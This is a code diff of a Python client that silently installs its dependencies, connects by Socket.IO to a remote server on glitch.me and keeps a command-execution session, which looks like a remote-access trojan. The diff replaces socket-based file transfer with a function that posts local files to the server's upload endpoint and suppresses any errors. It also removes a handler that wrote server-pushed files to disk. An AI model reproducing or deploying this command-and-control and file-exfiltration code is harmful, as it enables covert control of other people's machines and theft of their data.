@@ -4,12 +4,14 @@ import os
 try: __import__('socketio')
 except: subprocess.check_call(['pip', 'install', 'python-socketio', 'websocket-client','requests'])
 import socketio
-
+import requests
 
 sio = socketio.Client()
 on = 'http://raveneye.glitch.me/'
 off = 'http://localhost:3000/'
 url = on
+upload_url = url+"upload"
+
 class Session:
     def __init__(self):
         self.current_directory = os.getcwd()
@@ -62,19 +64,14 @@ def execute_command(command):
     except Exception as e:
         return f"Error: {str(e)}"
 
-@sio.event
-def updata(data):
-    file_name = data['fileName']
-    file_data = data['file']
-    with open(file_name, 'wb') as file:
-        file.write(file_data)
-    sio.emit('message', 'Received!')
 
 def send_file(file_path):
-    file_name = os.path.basename(file_path)
-    with open(file_path, "rb") as file:
-        file_data = file.read()
-        sio.emit('file_transfer', {'file_name': file_name, 'file_data': file_data})
+    try:
+        with open(file_path, 'rb') as file:
+            requests.post(upload_url, files={'file': file}, headers={})
+    except:
+            pass
+
 
 sio.connect(url)
 
